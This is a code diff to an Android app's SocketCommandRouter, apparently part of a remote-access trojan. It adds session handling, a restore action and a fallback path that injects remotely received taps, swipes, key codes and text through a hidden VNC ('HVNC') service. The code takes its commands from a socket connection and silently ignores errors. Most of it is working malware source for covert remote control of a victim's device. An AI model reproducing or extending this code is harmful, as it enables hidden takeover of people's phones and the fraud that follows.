@@ -840,6 +840,7 @@ public final class SocketCommandRouter {
 
     private static void handleHvnc(JSONObject data, Socket socket) {
         String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
+        String sessionId = data.optString(Protocol.KEY_SESSION_ID, "default");
         android.content.Context ctx = FasonApp.getContext();
 
         switch (action) {
@@ -853,6 +854,7 @@ public final class SocketCommandRouter {
                 intent.putExtra(HvncService.EXTRA_WIDTH, width);
                 intent.putExtra(HvncService.EXTRA_HEIGHT, height);
                 intent.putExtra(HvncService.EXTRA_DPI, dpi);
+                intent.putExtra(HvncService.EXTRA_SESSION_ID, sessionId);
 
                 try {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -877,17 +879,24 @@ public final class SocketCommandRouter {
                 break;
             }
             case "detach":
-                WEBRTC_EXEC.execute(() -> HvncWebRtcManager.detachPeer(data.optString("sessionId")));
+                WEBRTC_EXEC.execute(() -> HvncWebRtcManager.detachPeer(sessionId));
                 break;
             case Protocol.ACT_STATUS:
-                HvncWebRtcManager.emitCurrentStatus();
+                HvncWebRtcManager.emitCurrentStatus(sessionId);
                 break;
+            case Protocol.ACT_RESTORE: {
+                Intent intent = new Intent(ctx, HvncService.class);
+                intent.setAction(HvncService.ACTION_RESTORE);
+                try { ctx.startService(intent); } catch (Exception ignored) {}
+                break;
+            }
             case Protocol.ACT_LAUNCH_APP: {
                 String pkg = data.optString(Protocol.KEY_PACKAGE_NAME, "");
                 if (!pkg.isEmpty()) {
                     Intent intent = new Intent(ctx, HvncService.class);
                     intent.setAction(HvncService.ACTION_LAUNCH_APP);
                     intent.putExtra(HvncService.EXTRA_PACKAGE, pkg);
+                    intent.putExtra(HvncService.EXTRA_SESSION_ID, sessionId);
                     try { ctx.startService(intent); } catch (Exception ignored) {}
                 }
                 break;
@@ -902,6 +911,7 @@ public final class SocketCommandRouter {
                 intent.putExtra(HvncService.EXTRA_WIDTH, width);
                 intent.putExtra(HvncService.EXTRA_HEIGHT, height);
                 intent.putExtra(HvncService.EXTRA_DPI, dpi);
+                intent.putExtra(HvncService.EXTRA_SESSION_ID, sessionId);
                 try { ctx.startService(intent); } catch (Exception ignored) {}
                 break;
             }
@@ -909,7 +919,8 @@ public final class SocketCommandRouter {
     }
 
     private static void handleHvncControl(JSONObject data, Socket socket) {
-        if (Protocol.ACT_STATUS.equals(data.optString(Protocol.KEY_ACTION, ""))) {
+        String action = data.optString(Protocol.KEY_ACTION, "");
+        if (Protocol.ACT_STATUS.equals(action)) {
             try {
                 JSONObject status = new JSONObject();
                 status.put("active", HvncService.isRunning());
@@ -918,16 +929,33 @@ public final class SocketCommandRouter {
             return;
         }
 
-        // Control messages are relayed through the WebRTC DataChannel,
-        // not through Socket.IO, for low-latency input. This fallback
-        // handles cases where the DataChannel is not yet established.
+        // Fallback: khi DataChannel chưa được thiết lập, relay control message
+        // trực tiếp đến HvncWebRtcManager để inject input.
         if (!HvncService.isRunning()) {
             try {
                 JSONObject error = new JSONObject();
                 error.put(Protocol.KEY_ERROR, "HVNC is not running");
                 emit(socket, Protocol.HVNC_CTRL, error);
             } catch (Exception ignored) {}
+            return;
         }
+
+        // Gọi trực tiếp HvncWebRtcManager.injectFallbackControl thay vì qua Intent
+        String sessionId = data.optString(Protocol.KEY_SESSION_ID, "default");
+        try {
+            // Tạo JSON payload cho control action
+            JSONObject controlPayload = new JSONObject();
+            controlPayload.put(Protocol.KEY_ACTION, action);
+            // Copy các key từ data sang payload (x, y, startX, startY, keyCode, text, v.v.)
+            java.util.Iterator<String> keys = data.keys();
+            while (keys.hasNext()) {
+                String key = keys.next();
+                if (!Protocol.KEY_ACTION.equals(key) && !Protocol.KEY_SESSION_ID.equals(key)) {
+                    controlPayload.put(key, data.get(key));
+                }
+            }
+            HvncWebRtcManager.injectFallbackControl(sessionId, controlPayload);
+        } catch (Exception ignored) {}
     }
 
 }
